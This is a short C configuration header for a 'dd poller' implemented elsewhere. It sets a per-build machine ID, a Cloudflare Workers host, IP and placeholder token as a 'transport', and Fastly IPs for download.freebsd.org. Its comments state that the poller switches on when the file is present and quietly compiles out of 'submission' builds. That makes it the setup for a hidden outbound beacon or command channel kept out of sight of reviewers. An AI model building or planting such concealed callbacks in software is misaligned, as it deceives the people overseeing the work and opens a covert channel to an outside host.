// per-build identity stamped by the builder (prototype values).
// presence on disk enables the dd poller (see dd.c); a submission
// build simply omits this file and it compiles out.
#ifndef DD_CONF_H
#define DD_CONF_H

// random 64-bit machine id (builder: secrets.randbits(64))
#define DD_ID 0x9e3779b97f4a7c15ULL

// cloudflare worker transport
#define WS_HOST "quiet-shuttle.evan355.workers.dev"
#define WS_IP "104.21.10.98"
#define WS_TOKEN "changemenow"

// fastly anycast ips serving download.freebsd.org (validated)
#define CDN1 "151.101.1.242"
#define CDN2 "151.101.65.242"

#endif
